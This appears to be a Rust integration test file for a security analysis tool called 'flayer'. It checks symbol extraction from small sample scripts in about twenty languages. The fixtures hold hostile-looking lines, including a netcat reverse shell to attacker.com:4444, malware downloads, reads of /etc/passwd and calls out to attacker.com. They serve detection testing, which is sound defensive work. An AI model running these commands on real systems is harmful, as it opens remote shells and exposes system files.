//! Integration test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Integration tests for AST-based symbol extraction across all supported languages.
//!
//! This test file verifies that symbol extraction works correctly for all
//! languages with tree-sitter AST support.

use std::fs;
use tempfile::TempDir;

/// Helper to analyze a file and check for specific traits/symbols
/// Skips YARA and traits for speed - these tests only care about AST/tree-sitter parsing
fn analyze_file_for_traits(file_path: &str) -> serde_json::Value {
    let output = assert_cmd::cargo_bin_cmd!("flayer")
        .env("FLAYER_SKIP_YARA", "1") // Skip YARA - not needed for symbol extraction tests
        .env("FLAYER_SKIP_TRAITS", "1") // Skip trait loading - only testing AST parsing
        .args(["--json", "--verbose", "analyze", file_path])
        .output()
        .expect("Failed to run flayer");

    let stdout = String::from_utf8_lossy(&output.stdout);
    if let Ok(json) = serde_json::from_str::<serde_json::Value>(&stdout) {
        if json.get("files").and_then(|f| f.as_array()).is_some() {
            return json;
        }
        if json.get("type").and_then(|t| t.as_str()) == Some("file") {
            return serde_json::json!({ "files": [json] });
        }
    }

    let mut files = Vec::new();
    for line in stdout
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
    {
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(line) {
            if json.get("type").and_then(|t| t.as_str()) == Some("file") {
                files.push(json);
            }
        }
    }

    if !files.is_empty() {
        return serde_json::json!({ "files": files });
    }

    eprintln!(
        "Failed to parse analyzer JSON output (status={}): {}",
        output.status, stdout
    );
    serde_json::json!({})
}

/// Get the first file from the v2 files array
fn get_first_file(json: &serde_json::Value) -> Option<&serde_json::Value> {
    json.get("files")
        .and_then(|f| f.as_array())
        .and_then(|arr| arr.first())
}

/// Check if the file was detected as the expected type
/// The type field may include suffixes like "_script" (e.g., "python_script")
fn check_file_type(json: &serde_json::Value, expected: &str) -> bool {
    get_first_file(json)
        .and_then(|f| f.get("file_type"))
        .and_then(|v| v.as_str())
        .map(|ft| {
            let ft_lower = ft.to_lowercase();
            let expected_lower = expected.to_lowercase();
            // Handle both exact match and suffix variations (python_script, shell_script, etc.)
            ft_lower.contains(&expected_lower)
                || ft_lower.starts_with(&expected_lower)
                || (expected_lower == "shell" && ft_lower.contains("shell"))
        })
        .unwrap_or(false)
}

/// Check if the structure field exists and is non-empty
fn has_structure(json: &serde_json::Value) -> bool {
    get_first_file(json)
        .and_then(|f| f.get("structure"))
        .and_then(|s| s.as_array())
        .map(|arr| !arr.is_empty())
        .unwrap_or(false)
}

/// Get all symbols from the imports array
fn get_symbols(json: &serde_json::Value) -> Vec<String> {
    get_first_file(json)
        .and_then(|f| f.get("imports"))
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|imp| imp.get("symbol").and_then(|s| s.as_str()))
                .map(|s| s.to_string())
                .collect()
        })
        .unwrap_or_default()
}

// ==================== Python Tests ====================

#[test]
fn test_python_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.py");

    fs::write(
        &file_path,
        r#"#!/usr/bin/env python3
import os
import socket

os.system("whoami")
socket.socket()
open("/etc/passwd", "r")
exec("malicious")
eval("code")
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "python"),
        "Should detect as Python file"
    );

    let symbols = get_symbols(&json);
    eprintln!("Python symbols: {:?}", symbols);

    // Check for security-relevant symbols (may include module prefix like os.system)
    assert!(
        symbols
            .iter()
            .any(|s| s.contains("system") || s == "os.system"),
        "Should extract system call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s.contains("open")),
        "Should extract open call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "exec"),
        "Should extract exec call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "eval"),
        "Should extract eval call, got: {:?}",
        symbols
    );
}

// ==================== JavaScript Tests ====================

#[test]
fn test_javascript_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.js");

    fs::write(
        &file_path,
        r#"const fs = require('fs');
const exec = require('child_process').exec;

exec('whoami');
eval('malicious');
fetch('https://example.com');
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "javascript"),
        "Should detect as JavaScript file"
    );

    let symbols = get_symbols(&json);
    eprintln!("JavaScript symbols: {:?}", symbols);

    // Check for security-relevant symbols
    assert!(
        symbols.iter().any(|s| s == "require"),
        "Should extract require call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "exec"),
        "Should extract exec call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "eval"),
        "Should extract eval call, got: {:?}",
        symbols
    );
}

// ==================== Shell Tests ====================

#[test]
fn test_shell_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.sh");

    fs::write(
        &file_path,
        r#"#!/bin/bash
curl http://example.com
wget http://example.com/malware
chmod +x /tmp/payload
nc -e /bin/sh attacker.com 4444
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "shell"),
        "Should detect as Shell file"
    );

    let symbols = get_symbols(&json);
    eprintln!("Shell symbols: {:?}", symbols);

    // Check for security-relevant commands
    assert!(
        symbols.iter().any(|s| s == "curl"),
        "Should extract curl command, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "wget"),
        "Should extract wget command, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "chmod"),
        "Should extract chmod command, got: {:?}",
        symbols
    );
}

// ==================== C Tests ====================

#[test]
fn test_c_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.c");

    fs::write(
        &file_path,
        r#"#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/bin/sh");
    execve("/bin/sh", NULL, NULL);
    fork();
    socket(AF_INET, SOCK_STREAM, 0);
    return 0;
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "c"), "Should detect as C file");

    let symbols = get_symbols(&json);
    eprintln!("C symbols: {:?}", symbols);

    // Check for security-relevant symbols
    assert!(
        symbols.iter().any(|s| s == "system"),
        "Should extract system call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "execve"),
        "Should extract execve call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "fork"),
        "Should extract fork call, got: {:?}",
        symbols
    );
}

// ==================== Go Tests ====================

#[test]
fn test_go_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.go");

    fs::write(
        &file_path,
        r#"package main

import (
    "os/exec"
    "net"
)

func main() {
    exec.Command("sh", "-c", "whoami")
    net.Dial("tcp", "attacker.com:4444")
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "go"), "Should detect as Go file");

    let symbols = get_symbols(&json);
    eprintln!("Go symbols: {:?}", symbols);

    // Go may extract package names or method names depending on grammar
    // Just verify we get some symbols
    assert!(
        !symbols.is_empty(),
        "Should extract some symbols from Go code, got: {:?}",
        symbols
    );
}

// ==================== Ruby Tests ====================

#[test]
fn test_ruby_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.rb");

    fs::write(
        &file_path,
        r#"#!/usr/bin/env ruby
require 'open3'
system("whoami")
exec("/bin/sh")
eval("malicious")
File.read("/etc/passwd")
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "ruby"), "Should detect as Ruby file");

    let symbols = get_symbols(&json);
    eprintln!("Ruby symbols: {:?}", symbols);

    // Check for security-relevant symbols
    assert!(
        symbols.iter().any(|s| s == "require"),
        "Should extract require call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "system"),
        "Should extract system call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "eval"),
        "Should extract eval call, got: {:?}",
        symbols
    );
}

// ==================== PHP Tests ====================

#[test]
fn test_php_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.php");

    fs::write(
        &file_path,
        r#"<?php
system("whoami");
exec("ls -la");
shell_exec("cat /etc/passwd");
eval('malicious');
base64_decode("aGVsbG8=");
?>"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "php"), "Should detect as PHP file");

    let symbols = get_symbols(&json);
    eprintln!("PHP symbols: {:?}", symbols);

    // Check for security-relevant symbols
    assert!(
        symbols.iter().any(|s| s == "system"),
        "Should extract system call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "exec"),
        "Should extract exec call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "shell_exec"),
        "Should extract shell_exec call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "eval"),
        "Should extract eval call, got: {:?}",
        symbols
    );
}

// ==================== Lua Tests ====================

#[test]
fn test_lua_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.lua");

    fs::write(
        &file_path,
        r#"#!/usr/bin/env lua
local http = require("socket.http")
os.execute("whoami")
io.popen("ls -la")
dofile("/tmp/payload.lua")
loadstring("malicious")()
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "lua"), "Should detect as Lua file");

    let symbols = get_symbols(&json);
    eprintln!("Lua symbols: {:?}", symbols);

    // Check for security-relevant symbols
    assert!(
        symbols.iter().any(|s| s == "require"),
        "Should extract require call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "dofile"),
        "Should extract dofile call, got: {:?}",
        symbols
    );
}

// ==================== Perl Tests ====================

#[test]
fn test_perl_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.pl");

    fs::write(
        &file_path,
        r#"#!/usr/bin/perl
use strict;
use warnings;

system("whoami");
exec("/bin/sh");
open(my $fh, "<", "/etc/passwd");
socket(SOCK, AF_INET, SOCK_STREAM, 0);
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "perl"), "Should detect as Perl file");

    let symbols = get_symbols(&json);
    eprintln!("Perl symbols: {:?}", symbols);

    // Perl parsing may extract symbols differently depending on grammar
    // The important thing is that AST parsing works
    assert!(
        has_structure(&json),
        "Should have structure indicating AST parsing worked"
    );
}

// ==================== PowerShell Tests ====================

#[test]
fn test_powershell_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.ps1");

    fs::write(
        &file_path,
        r#"Invoke-Expression "whoami"
Invoke-WebRequest -Uri "https://example.com/malware"
Start-Process -FilePath "cmd.exe"
Get-Content "C:\secret.txt"
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "powershell"),
        "Should detect as PowerShell file"
    );

    let symbols = get_symbols(&json);
    eprintln!("PowerShell symbols: {:?}", symbols);

    // PowerShell parsing may extract cmdlets differently depending on grammar
    // The important thing is that AST parsing works
    assert!(
        has_structure(&json),
        "Should have structure indicating AST parsing worked"
    );
}

// ==================== Java Tests ====================

#[test]
fn test_java_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("Test.java");

    fs::write(
        &file_path,
        r#"public class Test {
    public static void main(String[] args) throws Exception {
        Runtime.getRuntime().exec("whoami");
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", "id");
        pb.start();
    }
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "java"), "Should detect as Java file");

    let symbols = get_symbols(&json);
    eprintln!("Java symbols: {:?}", symbols);

    // Check for security-relevant symbols
    // Runtime class should be extracted
    assert!(
        symbols.iter().any(|s| s == "Runtime"),
        "Should extract Runtime class, got: {:?}",
        symbols
    );
}

// ==================== C# Tests ====================

#[test]
fn test_csharp_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.cs");

    fs::write(
        &file_path,
        r#"using System;
using System.Diagnostics;

class Test {
    static void Main() {
        Process.Start("cmd.exe");
        System.IO.File.ReadAllText("secret.txt");
    }
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "csharp"), "Should detect as C# file");

    let symbols = get_symbols(&json);
    eprintln!("C# symbols: {:?}", symbols);

    // C# parsing extracts method invocations
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}

// ==================== TypeScript Tests ====================

#[test]
fn test_typescript_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.ts");

    fs::write(
        &file_path,
        r#"import * as fs from 'fs';
import { exec } from 'child_process';

exec('whoami', (err, stdout) => console.log(stdout));
eval('malicious');
fetch('https://attacker.com');
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "typescript"),
        "Should detect as TypeScript file"
    );

    let symbols = get_symbols(&json);
    eprintln!("TypeScript symbols: {:?}", symbols);

    // Check for security-relevant symbols
    assert!(
        symbols.iter().any(|s| s == "exec"),
        "Should extract exec call, got: {:?}",
        symbols
    );
    assert!(
        symbols.iter().any(|s| s == "eval"),
        "Should extract eval call, got: {:?}",
        symbols
    );
}

// ==================== Rust Tests ====================

#[test]
fn test_rust_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.rs");

    fs::write(
        &file_path,
        r#"use std::process::Command;

fn main() {
    Command::new("sh").arg("-c").arg("whoami").output();
    std::fs::read_to_string("/etc/passwd");
    println!("Hello");
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "rust"), "Should detect as Rust file");

    let symbols = get_symbols(&json);
    eprintln!("Rust symbols: {:?}", symbols);

    // Rust extracts macro invocations and function calls
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}

// ==================== All Languages Have AST Support ====================

#[test]
fn test_all_ast_languages_supported() {
    let temp_dir = TempDir::new().unwrap();

    // Map of extension -> (content, expected_type)
    let test_cases = vec![
        ("test.py", "print('hello')\n", "python"),
        ("test.js", "console.log('hello');\n", "javascript"),
        ("test.ts", "console.log('hello');\n", "typescript"),
        ("test.sh", "#!/bin/bash\necho hello\n", "shell"),
        ("test.c", "int main() { return 0; }\n", "c"),
        ("test.go", "package main\nfunc main() {}\n", "go"),
        ("test.rs", "fn main() {}\n", "rust"),
        ("test.rb", "puts 'hello'\n", "ruby"),
        ("test.php", "<?php echo 'hello'; ?>\n", "php"),
        ("test.java", "class Test {}\n", "java"),
        ("test.cs", "class Test {}\n", "csharp"),
        ("test.lua", "print('hello')\n", "lua"),
        ("test.pl", "#!/usr/bin/perl\nprint 'hello';\n", "perl"),
        ("test.ps1", "Write-Host 'hello'\n", "powershell"),
    ];

    for (filename, content, expected_type) in test_cases {
        let file_path = temp_dir.path().join(filename);
        fs::write(&file_path, content).unwrap();

        let json = analyze_file_for_traits(file_path.to_str().unwrap());

        let actual_type = get_first_file(&json)
            .and_then(|f| f.get("file_type"))
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        assert!(
            check_file_type(&json, expected_type),
            "File {} should be detected as {}, got {}",
            filename,
            expected_type,
            actual_type
        );

        // Verify we get some structure back (basic parsing works)
        assert!(
            has_structure(&json),
            "File {} should have structure field indicating AST parsing worked",
            filename
        );
    }
}

// ==================== Swift Tests ====================

#[test]
fn test_swift_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.swift");

    fs::write(
        &file_path,
        r#"import Foundation

func main() {
    let task = Process()
    task.launchPath = "/bin/sh"
    task.launch()
    FileManager.default.contents(atPath: "/etc/passwd")
    URLSession.shared.dataTask(with: URL(string: "https://attacker.com")!)
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "swift"),
        "Should detect as Swift file"
    );

    let symbols = get_symbols(&json);
    eprintln!("Swift symbols: {:?}", symbols);

    // Swift parsing should extract function calls
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}

// ==================== Objective-C Tests ====================

#[test]
fn test_objc_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.m");

    fs::write(
        &file_path,
        r#"#import <Foundation/Foundation.h>

int main() {
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/bin/sh"];
    [task launch];
    system("whoami");
    return 0;
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    let actual_type = get_first_file(&json)
        .and_then(|f| f.get("file_type"))
        .and_then(|v| v.as_str())
        .unwrap_or("unknown");

    assert!(
        check_file_type(&json, "objc"),
        "Should detect as Objective-C file, got: {}",
        actual_type
    );

    let symbols = get_symbols(&json);
    eprintln!("Objective-C symbols: {:?}", symbols);

    // ObjC uses message expressions for method calls
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}

// ==================== Groovy Tests ====================

#[test]
fn test_groovy_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.groovy");

    fs::write(
        &file_path,
        r#"def result = "whoami".execute()
println result.text
new File("/etc/passwd").text
Runtime.getRuntime().exec("id")
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "groovy"),
        "Should detect as Groovy file"
    );

    let symbols = get_symbols(&json);
    eprintln!("Groovy symbols: {:?}", symbols);

    // Groovy parsing should extract method calls
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}

// ==================== Scala Tests ====================

#[test]
fn test_scala_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.scala");

    fs::write(
        &file_path,
        r#"import sys.process._
import java.io.File

object Main extends App {
  "whoami".!
  Runtime.getRuntime().exec("id")
  scala.io.Source.fromFile("/etc/passwd").mkString
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "scala"),
        "Should detect as Scala file"
    );

    let symbols = get_symbols(&json);
    eprintln!("Scala symbols: {:?}", symbols);

    // Scala parsing should extract apply expressions and method calls
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}

// ==================== Zig Tests ====================

#[test]
fn test_zig_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.zig");

    fs::write(
        &file_path,
        r#"const std = @import("std");

pub fn main() !void {
    const allocator = std.heap.page_allocator;
    var child = std.process.Child.init(
        &[_][]const u8{"/bin/sh", "-c", "whoami"},
        allocator
    );
    _ = try child.spawn();
}
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(check_file_type(&json, "zig"), "Should detect as Zig file");

    let symbols = get_symbols(&json);
    eprintln!("Zig symbols: {:?}", symbols);

    // Zig parsing should extract function calls
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}

// ==================== Elixir Tests ====================

#[test]
fn test_elixir_symbol_extraction() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test.ex");

    fs::write(
        &file_path,
        r#"defmodule Malware do
  def run do
    System.cmd("whoami", [])
    File.read!("/etc/passwd")
    Code.eval_string("malicious")
    :os.cmd('id')
  end
end
"#,
    )
    .unwrap();

    let json = analyze_file_for_traits(file_path.to_str().unwrap());

    assert!(
        check_file_type(&json, "elixir"),
        "Should detect as Elixir file"
    );

    let symbols = get_symbols(&json);
    eprintln!("Elixir symbols: {:?}", symbols);

    // Elixir parsing should extract function calls
    assert!(
        !symbols.is_empty() || has_structure(&json),
        "Should extract symbols or have AST structure, got: {:?}",
        symbols
    );
}
